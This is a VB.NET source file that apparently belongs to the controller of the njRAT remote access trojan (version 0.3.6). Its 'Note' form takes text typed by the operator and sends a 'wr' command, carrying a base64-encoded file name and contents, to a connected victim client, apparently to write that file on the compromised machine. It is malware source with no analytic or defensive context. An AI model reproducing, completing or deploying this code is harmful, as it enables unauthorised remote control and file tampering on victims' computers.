Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT
Imports System.Text

Public Class Note
    Public FN As String
    Public SK As Client
    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        Me.ToolStripMenuItem1.Enabled = True
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Dim strArray As String() = New String(5 - 1) {}
        strArray(0) = "wr"
        strArray(1) = ind.Y
        strArray(2) = ENB(Me.FN)
        strArray(3) = ind.Y
        Dim box As TextBox = Me.TextBox1
        Dim text As String = box.Text
        box.Text = [text]
        strArray(4) = ENB([text])
        Me.SK.Send(String.Concat(strArray))
        Me.ToolStripMenuItem1.Enabled = False
    End Sub
    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function

End Class